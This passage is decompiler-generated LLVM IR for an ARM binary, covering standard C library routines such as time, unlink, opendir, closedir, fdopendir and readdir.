  %v2_10e4c = icmp eq i32 %v1_10e4c, 0
  br i1 %v2_10e4c, label %dec_label_pc_10e6c, label %dec_label_pc_10e54

dec_label_pc_10e54:                               ; preds = %dec_label_pc_10e3c, %dec_label_pc_10e48
  %v2_10e54 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_10e54 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_10e6c

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_10e48, %entry, %dec_label_pc_10e54
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_10ea0, label %dec_label_pc_10e88

dec_label_pc_10e88:                               ; preds = %dec_label_pc_10e6c
  %v1_10e8c = sub i32 0, %arg1
  %v3_10e90 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10e90 = sext i16 %v3_10e90 to i32
  %v0_10e94 = call i32 @__aeabi_read_tp()
  %v3_10e98 = add i32 %v4_10e90, %v0_10e94
  %v4_10e98 = inttoptr i32 %v3_10e98 to i32*
  store i32 %v1_10e8c, i32* %v4_10e98, align 4
  br label %dec_label_pc_10ea0

dec_label_pc_10ea0:                               ; preds = %dec_label_pc_10e6c, %dec_label_pc_10e88
  %v1_10ea8 = phi i32 [ %arg1, %dec_label_pc_10e6c ], [ -1, %dec_label_pc_10e88 ]
  ret i32 %v1_10ea8

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10e6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e54, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10eb4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_10ec4 = call i32 @gettimeofday(i32 %v2_10eb4, i32 0)
  %v2_10ec8 = load i32, i32* %stack_var_-16, align 4
  %v2_10ecc = icmp eq i32* %arg1, null
  br i1 %v2_10ecc, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_10ec8, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_10ec8

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ee0 = load i32, i32* @r7, align 4
  store i32 %v3_10ee0, i32* %stack_var_-8, align 4
  %v0_10eec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10eec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10eec, -4095
  br i1 %tmp, label %dec_label_pc_10f14, label %dec_label_pc_10efc

dec_label_pc_10efc:                               ; preds = %entry
  %v0_10f00 = call i32 @__aeabi_read_tp()
  %v3_10f04 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10f04 = sext i16 %v3_10f04 to i32
  %v0_10f08 = load i32, i32* %r2.global-to-local, align 4
  %v1_10f08 = sub i32 0, %v0_10f08
  store i32 %v1_10f08, i32* %r2.global-to-local, align 4
  %v3_10f0c = add i32 %v4_10f04, %v0_10f00
  %v4_10f0c = inttoptr i32 %v3_10f0c to i32*
  store i32 %v1_10f08, i32* %v4_10f0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10f14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10f14

dec_label_pc_10f14:                               ; preds = %entry, %dec_label_pc_10efc
  %v1_10f18 = phi i32 [ %v0_10eec, %entry ], [ -1, %dec_label_pc_10efc ]
  %v2_10f14 = phi i32 [ %v3_10ee0, %entry ], [ %v2_10f14.pre, %dec_label_pc_10efc ]
  store i32 %v2_10f14, i32* @r7, align 4
  ret i32 %v1_10f18

; uselistorder directives
  uselistorder i32 %v0_10eec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f14, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10f20 = load i32, i32* @r4, align 4
  store i32 %v3_10f20, i32* %stack_var_-24, align 4
  %v9_10f20 = load i32, i32* @r6, align 4
  %v12_10f20 = load i32, i32* @r7, align 4
  %v15_10f20 = load i32, i32* @r8, align 4
  %v18_10f20 = load i32, i32* @lr, align 4
  %v2_10f24 = load i32, i32* %arg1, align 4
  store i32 %v2_10f24, i32* %r3.global-to-local, align 4
  %v3_10f2c = icmp eq i32 %v2_10f24, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r6, align 4
  br i1 %v3_10f2c, label %dec_label_pc_10f40, label %dec_label_pc_10f5c

dec_label_pc_10f40:                               ; preds = %entry
  store i32 68328, i32* %r2.global-to-local, align 4
  %v0_10f44 = call i32 @__aeabi_read_tp()
  %v3_10f48 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10f48 = sext i16 %v3_10f48 to i32
  store i32 %v4_10f48, i32* %r2.global-to-local, align 4
  %v0_10f4c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10f4c, i32* %r1.global-to-local, align 4
  %v1_10f50 = add i32 %v0_10f4c, 10
  store i32 %v1_10f50, i32* %r3.global-to-local, align 4
  %v3_10f54 = add i32 %v4_10f48, %v0_10f44
  %v4_10f54 = inttoptr i32 %v3_10f54 to i32*
  store i32 %v1_10f50, i32* %v4_10f54, align 4
  %v0_11004.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11004

dec_label_pc_10f5c:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_10f60 = add i32 %tmp, 24
  store i32 %v1_10f60, i32* %r2.global-to-local, align 4
  %v4_10f68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 68) to i32*), align 4
  store i32 %v4_10f68, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10f74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10f74)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10f8c = load i32, i32* @r6, align 4
  %v2_10f8c = add i32 %v0_10f8c, 16
  %v3_10f8c = inttoptr i32 %v2_10f8c to i32*
  %v4_10f8c = load i32, i32* %v3_10f8c, align 4
  call void @__pseudo_branch(i32 %v4_10f8c)
  %v0_10f98 = load i32, i32* @r7, align 4
  %v1_10f98 = inttoptr i32 %v0_10f98 to i32*
  %v2_10f98 = load i32, i32* %v1_10f98, align 4
  store i32 %v2_10f98, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_10fa8 = load i32, i32* @r8, align 4
  store i32 %v0_10fa8, i32* %v1_10f98, align 4
  %v0_10fac = load i32, i32* @r6, align 4
  %v1_10fac = load i32, i32* %r3.global-to-local, align 4
  %v2_10fac = add i32 %v1_10fac, %v0_10fac
  %v3_10fac = inttoptr i32 %v2_10fac to i32*
  %v4_10fac = load i32, i32* %v3_10fac, align 4
  store i32 ptrtoint (i32* @global_var_10fb8.378 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10fac)
  %v0_10fb8 = load i32, i32* @r7, align 4
  %v1_10fb8 = add i32 %v0_10fb8, 12
  %v2_10fb8 = inttoptr i32 %v1_10fb8 to i32*
  %v3_10fb8 = load i32, i32* %v2_10fb8, align 4
  store i32 %v3_10fb8, i32* @r0, align 4
  %v0_10fbc = call i32 @free()
  %v0_10fc0 = load i32, i32* @r7, align 4
  store i32 %v0_10fc0, i32* @r0, align 4
  %v0_10fc4 = call i32 @free()
  %v0_10fcc = load i32, i32* @r4, align 4
  store i32 %v0_10fcc, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_10fcc, -4095
  br i1 %tmp11, label %dec_label_pc_11000, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %dec_label_pc_10f5c
  store i32 68160, i32* %r3.global-to-local, align 4
  %v0_10fec = call i32 @__aeabi_read_tp()
  %v3_10ff0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10ff0 = sext i16 %v3_10ff0 to i32
  store i32 %v4_10ff0, i32* %r3.global-to-local, align 4
  %v0_10ff4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ff4 = sub i32 0, %v0_10ff4
  store i32 %v1_10ff4, i32* %r2.global-to-local, align 4
  %v3_10ff8 = add i32 %v4_10ff0, %v0_10fec
  %v4_10ff8 = inttoptr i32 %v3_10ff8 to i32*
  store i32 %v1_10ff4, i32* %v4_10ff8, align 4
  %v0_10ffc = load i32, i32* @r8, align 4
  br label %dec_label_pc_11000

dec_label_pc_11000:                               ; preds = %dec_label_pc_10f5c, %dec_label_pc_10fe8
  %v0_11000 = phi i32 [ %v0_10fcc, %dec_label_pc_10f5c ], [ %v0_10ffc, %dec_label_pc_10fe8 ]
  store i32 %v0_11000, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11004

dec_label_pc_11004:                               ; preds = %dec_label_pc_10f40, %dec_label_pc_11000
  %v0_11004 = phi i32 [ %v0_11004.pre, %dec_label_pc_10f40 ], [ %v0_11000, %dec_label_pc_11000 ]
  %v2_1100c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1100c, i32* @r4, align 4
  store i32 %v9_10f20, i32* @r6, align 4
  store i32 %v12_10f20, i32* @r7, align 4
  store i32 %v15_10f20, i32* @r8, align 4
  store i32 %v18_10f20, i32* @lr, align 4
  ret i32 %v0_11004

; uselistorder directives
  uselistorder i32 %v0_10fcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11004, { 1, 0 }
  uselistorder label %dec_label_pc_11000, { 1, 0 }
}

define i32 @function_1101c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1101c:
  %v0_1101c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1101c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1101c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1101c, %bb
  %v7_1102c = phi i32 [ %arg1, %dec_label_pc_1101c ], [ 0, %bb ]
  ret i32 %v7_1102c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11030 = load i32, i32* @r4, align 4
  %v6_11030 = load i32, i32* @r5, align 4
  %v9_11030 = load i32, i32* @r6, align 4
  %v12_11030 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_11044 = call i32 @malloc()
  %v2_1104c = icmp eq i32 %v0_11044, 0
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r6, align 4
  br i1 %v2_1104c, label %bb, label %dec_label_pc_1105c

bb:                                               ; preds = %entry
  br label %dec_label_pc_110e8

dec_label_pc_1105c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11060 = load i32, i32* @r4, align 4
  %v2_11060 = icmp ugt i32 %v0_11060, 511
  %v2_11064 = add i32 %v0_11044, 4
  %v3_11064 = inttoptr i32 %v2_11064 to i32*
  store i32 0, i32* %v3_11064, align 4
  %v0_11068 = load i32, i32* %r3.global-to-local, align 4
  %v2_11068 = add i32 %v0_11044, 16
  %v3_11068 = inttoptr i32 %v2_11068 to i32*
  store i32 %v0_11068, i32* %v3_11068, align 4
  %v0_1106c = load i32, i32* %r3.global-to-local, align 4
  %v2_1106c = add i32 %v0_11044, 8
  %v3_1106c = inttoptr i32 %v2_1106c to i32*
  store i32 %v0_1106c, i32* %v3_1106c, align 4
  br i1 %v2_11060, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1105c
  %v0_110742 = load i32, i32* @r4, align 4
  %v2_110743 = add i32 %v0_11044, 20
  %v3_110744 = inttoptr i32 %v2_110743 to i32*
  store i32 %v0_110742, i32* %v3_110744, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1105c
  %v1_11070 = load i32, i32* %r3.global-to-local, align 4
  %v2_11070 = add i32 %v1_11070, 512
  store i32 %v2_11070, i32* %r3.global-to-local, align 4
  %v0_11074 = load i32, i32* @r4, align 4
  %v2_11074 = add i32 %v0_11044, 20
  %v3_11074 = inttoptr i32 %v2_11074 to i32*
  store i32 %v0_11074, i32* %v3_11074, align 4
  %v1_11078 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_11078, i32* %v3_11074, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_11044, i32* @r5, align 4
  %v0_11080 = load i32, i32* @r7, align 4
  %v2_11080 = inttoptr i32 %v0_11044 to i32*
  store i32 %v0_11080, i32* %v2_11080, align 4
  %v0_11084 = load i32, i32* @r5, align 4
  %v1_11084 = add i32 %v0_11084, 20
  %v2_11084 = inttoptr i32 %v1_11084 to i32*
  %v3_11084 = load i32, i32* %v2_11084, align 4
  store i32 %v3_11084, i32* %r1.global-to-local, align 4
  %v2_1108c = call i32 @calloc(i32 1, i32 %v3_11084)
  %v2_11090 = icmp eq i32 %v2_1108c, 0
  store i32 %v2_1108c, i32* @r4, align 4
  %v1_11098 = load i32, i32* @r5, align 4
  %v2_11098 = add i32 %v1_11098, 12
  %v3_11098 = inttoptr i32 %v2_11098 to i32*
  store i32 %v2_1108c, i32* %v3_11098, align 4
  br i1 %v2_11090, label %dec_label_pc_110a0, label %dec_label_pc_110b0

dec_label_pc_110a0:                               ; preds = %bb17
  %v0_110a0 = load i32, i32* @r5, align 4
  store i32 %v0_110a0, i32* @r0, align 4
  %v0_110a4 = call i32 @free()
  %v0_110a8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_110e8

dec_label_pc_110b0:                               ; preds = %bb17
  %v0_110b4 = load i32, i32* @r6, align 4
  %v2_110b4 = add i32 %v0_110b4, -34036
  store i32 %v2_110b4, i32* %r3.global-to-local, align 4
  %v1_110bc = inttoptr i32 %v2_110b4 to i32*
  %v2_110bc = load i32, i32* %v1_110bc, align 4
  %v3_110bc = add i32 %v0_110b4, -34032
  %v4_110bc = inttoptr i32 %v3_110bc to i32*
  %v5_110bc = load i32, i32* %v4_110bc, align 4
  store i32 %v5_110bc, i32* %r1.global-to-local, align 4
  %v6_110bc = add i32 %v0_110b4, -34028
  %v7_110bc = inttoptr i32 %v6_110bc to i32*
  %v8_110bc = load i32, i32* %v7_110bc, align 4
  store i32 %v8_110bc, i32* %r2.global-to-local, align 4
  %v9_110bc = add i32 %v0_110b4, -34024
  %v10_110bc = inttoptr i32 %v9_110bc to i32*
  %v11_110bc = load i32, i32* %v10_110bc, align 4
  store i32 %v11_110bc, i32* %r3.global-to-local, align 4
  %v12_110bc = add i32 %v0_110b4, -34020
  %v1_110c8 = inttoptr i32 %v12_110bc to i32*
  %v2_110c8 = load i32, i32* %v1_110c8, align 4
  %v3_110c8 = add i32 %v0_110b4, -34016
  %v4_110c8 = inttoptr i32 %v3_110c8 to i32*
  %v5_110c8 = load i32, i32* %v4_110c8, align 4
  store i32 %v2_110c8, i32* %stack_var_-32, align 4
  store i32 %v5_110bc, i32* %r1.global-to-local, align 4
  store i32 %v8_110bc, i32* %r2.global-to-local, align 4
  store i32 %v11_110bc, i32* %r3.global-to-local, align 4
  %v0_110d8 = load i32, i32* @r5, align 4
  %v1_110d8 = add i32 %v0_110d8, 24
  %v1_110dc = inttoptr i32 %v1_110d8 to i32*
  store i32 %v2_110bc, i32* %v1_110dc, align 4
  %v3_110dc = add i32 %v0_110d8, 28
  %v4_110dc = inttoptr i32 %v3_110dc to i32*
  %v5_110dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_110dc, i32* %v4_110dc, align 4
  %v6_110dc = add i32 %v0_110d8, 32
  %v7_110dc = inttoptr i32 %v6_110dc to i32*
  %v8_110dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_110dc, i32* %v7_110dc, align 4
  %v9_110dc = add i32 %v0_110d8, 36
  %v10_110dc = inttoptr i32 %v9_110dc to i32*
  %v11_110dc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_110dc, i32* %v10_110dc, align 4
  %v12_110dc = add i32 %v0_110d8, 40
  %v2_110e0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_110c8, i32* %r1.global-to-local, align 4
  %v1_110e4 = inttoptr i32 %v12_110dc to i32*
  store i32 %v2_110e0, i32* %v1_110e4, align 4
  %v3_110e4 = add i32 %v0_110d8, 44
  %v4_110e4 = inttoptr i32 %v3_110e4 to i32*
  %v5_110e4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_110e4, i32* %v4_110e4, align 4
  %v0_110e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_110e8

dec_label_pc_110e8:                               ; preds = %bb, %dec_label_pc_110a0, %dec_label_pc_110b0
  %v0_110e8 = phi i32 [ 0, %bb ], [ %v0_110a8, %dec_label_pc_110a0 ], [ %v0_110e8.pre, %dec_label_pc_110b0 ]
  store i32 %v3_11030, i32* @r4, align 4
  store i32 %v6_11030, i32* @r5, align 4
  store i32 %v9_11030, i32* @r6, align 4
  store i32 %v12_11030, i32* @r7, align 4
  ret i32 %v0_110e8

; uselistorder directives
  uselistorder i32 %v2_1108c, { 1, 0, 2 }
  uselistorder i32 %v0_11044, { 2, 1, 6, 0, 4, 5, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 1, 8, 5, 9, 6, 10, 2, 11, 3, 12 }
  uselistorder label %dec_label_pc_110e8, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_11100 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_11108 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_11138, label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %entry
  %v0_11124 = call i32 @__aeabi_read_tp()
  %v3_11128 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11128 = sext i16 %v3_11128 to i32
  %v0_1112c = load i32, i32* %r2.global-to-local, align 4
  %v1_1112c = sub i32 0, %v0_1112c
  store i32 %v1_1112c, i32* %r2.global-to-local, align 4
  %v3_11130 = add i32 %v4_11128, %v0_11124
  %v4_11130 = inttoptr i32 %v3_11130 to i32*
  store i32 %v1_1112c, i32* %v4_11130, align 4
  br label %dec_label_pc_1115c

dec_label_pc_11138:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_11138 = icmp slt i32 %arg1, 0
  br i1 %v1_11138, label %dec_label_pc_1115c, label %dec_label_pc_11140

dec_label_pc_11140:                               ; preds = %dec_label_pc_11138
  store i32 %v2_11108, i32* @r1, align 4
  %v0_11144 = call i32 @fstat()
  %v1_11148 = icmp slt i32 %v0_11144, 0
  br i1 %v1_11148, label %dec_label_pc_11150, label %dec_label_pc_11164

dec_label_pc_11150:                               ; preds = %dec_label_pc_11140
  br label %dec_label_pc_1115c

dec_label_pc_1115c:                               ; preds = %dec_label_pc_11150, %dec_label_pc_11138, %dec_label_pc_11120
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_111a8

dec_label_pc_11164:                               ; preds = %dec_label_pc_11140
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1116c = load i32, i32* @r7, align 4
  %v3_11170 = call i32 @__GI___fcntl_nocancel(i32 %v0_1116c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11178 = load i32, i32* @r7, align 4
  %v2_1117c = call i32 @fd_to_DIR(i32 %v0_11178, i32 %tmp)
  store i32 %v2_1117c, i32* %r1.global-to-local, align 4
  %v2_11180 = icmp eq i32 %v2_1117c, 0
  br i1 %v2_11180, label %dec_label_pc_11188, label %dec_label_pc_111a8

dec_label_pc_11188:                               ; preds = %dec_label_pc_11164
  %v0_11198 = call i32 @__aeabi_read_tp()
  %v3_1119c = load i16, i16* @global_var_21a38.351, align 2
  %v4_1119c = sext i16 %v3_1119c to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_111a4 = add i32 %v4_1119c, %v0_11198
  %v4_111a4 = inttoptr i32 %v3_111a4 to i32*
  store i32 12, i32* %v4_111a4, align 4
  %v0_111a8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_111a8

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11164, %dec_label_pc_1115c, %dec_label_pc_11188
  %v0_111a8 = phi i32 [ %v2_1117c, %dec_label_pc_11164 ], [ 0, %dec_label_pc_1115c ], [ %v0_111a8.pre, %dec_label_pc_11188 ]
  store i32 %v3_11100, i32* @r7, align 4
  ret i32 %v0_111a8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_111a8, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_111b8:
  %v0_111b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_111b8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_111b8
  %v1_111b8 = load i32, i32* @r8, align 4
  %v5_111bc = mul i32 %v1_111b8, 262144
  %v6_111bc = and i32 %v5_111bc, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_111b8, %bb
  %v4_111c0 = phi i32 [ %arg1, %dec_label_pc_111b8 ], [ %v6_111bc, %bb ]
  ret i32 %v4_111c0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_111c8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_111c8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_111d4 = call i32 @fstat()
  store i32 %v0_111d4, i32* @r5, align 4
  %v2_111d8 = icmp eq i32 %v0_111d4, 0
  br i1 %v2_111d8, label %dec_label_pc_111e0, label %dec_label_pc_11258

dec_label_pc_111e0:                               ; preds = %entry
  %v1_111e4 = and i32 %tmp4, 61440
  store i32 %v1_111e4, i32* @r3, align 4
  %v7_111e8 = icmp eq i32 %v1_111e4, 16384
  br i1 %v7_111e8, label %dec_label_pc_11208, label %dec_label_pc_111f0

dec_label_pc_111f0:                               ; preds = %dec_label_pc_111e0
  %v0_111f4 = call i32 @__aeabi_read_tp()
  %v3_111f8 = load i16, i16* @global_var_21a38.351, align 2
  %v0_111fc = load i32, i32* @r5, align 4
  store i32 %v0_111fc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1123c

dec_label_pc_11208:                               ; preds = %dec_label_pc_111e0
  %v0_11208 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_11210 = call i32 @__libc_fcntl(i32 %v0_11208, i32 3)
  %v7_11214 = icmp eq i32 %v2_11210, -1
  br i1 %v7_11214, label %dec_label_pc_11258, label %dec_label_pc_1121c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_11208
  %v1_1121c = urem i32 %v2_11210, 4
  store i32 %v1_1121c, i32* %r3.global-to-local, align 4
  %v7_11220 = icmp eq i32 %v1_1121c, 1
  br i1 %v7_11220, label %dec_label_pc_11228, label %dec_label_pc_11244

dec_label_pc_11228:                               ; preds = %dec_label_pc_1121c
  %v0_1122c = call i32 @__aeabi_read_tp()
  %v3_11230 = load i16, i16* @global_var_21a38.351, align 2
  %v0_11234 = load i32, i32* @r5, align 4
  store i32 %v0_11234, i32* %r1.global-to-local, align 4
  %v0_11238 = load i32, i32* %r3.global-to-local, align 4
  %v1_11238 = add i32 %v0_11238, 21
  br label %dec_label_pc_1123c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_111f0, %dec_label_pc_11228
  %v2_1123c.in = phi i16 [ %v3_111f8, %dec_label_pc_111f0 ], [ %v3_11230, %dec_label_pc_11228 ]
  %v1_1123c = phi i32 [ %v0_111f4, %dec_label_pc_111f0 ], [ %v0_1122c, %dec_label_pc_11228 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_111f0 ], [ %v1_11238, %dec_label_pc_11228 ]
  %v2_1123c = sext i16 %v2_1123c.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_1123c = add i32 %v1_1123c, %v2_1123c
  %v4_1123c = inttoptr i32 %v3_1123c to i32*
  store i32 %storemerge, i32* %v4_1123c, align 4
  %v0_1125c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1125c

dec_label_pc_11244:                               ; preds = %dec_label_pc_1121c
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11248 = load i32, i32* @r4, align 4
  %v2_1124c = call i32 @fd_to_DIR(i32 %v0_11248, i32 %tmp)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1125c

dec_label_pc_11258:                               ; preds = %entry, %dec_label_pc_11208
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1125c

dec_label_pc_1125c:                               ; preds = %dec_label_pc_11244, %dec_label_pc_1123c, %dec_label_pc_11258
  %v0_1125c = phi i32 [ %v2_1124c, %dec_label_pc_11244 ], [ %v0_1125c.pre, %dec_label_pc_1123c ], [ 0, %dec_label_pc_11258 ]
  ret i32 %v0_1125c

; uselistorder directives
  uselistorder i32 %v1_1121c, { 1, 0 }
  uselistorder i32 %v2_11210, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 8, 5, 1, 2, 3, 4 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1125c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11258, { 1, 0 }
  uselistorder label %dec_label_pc_1123c, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11274 = load i32, i32* @r4, align 4
  %v6_11274 = load i32, i32* @r5, align 4
  %v9_11274 = load i32, i32* @r6, align 4
  %v12_11274 = load i32, i32* @r7, align 4
  %v15_11274 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r6, align 4
  %v1_11288 = add i32 %tmp, 24
  store i32 %v1_11288, i32* @r4, align 4
  %v4_1128c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 68) to i32*), align 4
  store i32 %v4_1128c, i32* %r1.global-to-local, align 4
  store i32 %v1_11288, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_112a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_112a0)
  %v0_112b4 = load i32, i32* @r6, align 4
  %v2_112b4 = add i32 %v0_112b4, 16
  %v3_112b4 = inttoptr i32 %v2_112b4 to i32*
  %v4_112b4 = load i32, i32* %v3_112b4, align 4
  store i32 %v4_112b4, i32* @ip, align 4
  store i32 70336, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_112b4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_112c4

dec_label_pc_112c4:                               ; preds = %dec_label_pc_112f4, %entry
  %v0_112c4 = load i32, i32* @r5, align 4
  %v1_112c4 = add i32 %v0_112c4, 4
  %v2_112c4 = inttoptr i32 %v1_112c4 to i32*
  %v3_112c4 = load i32, i32* %v2_112c4, align 4
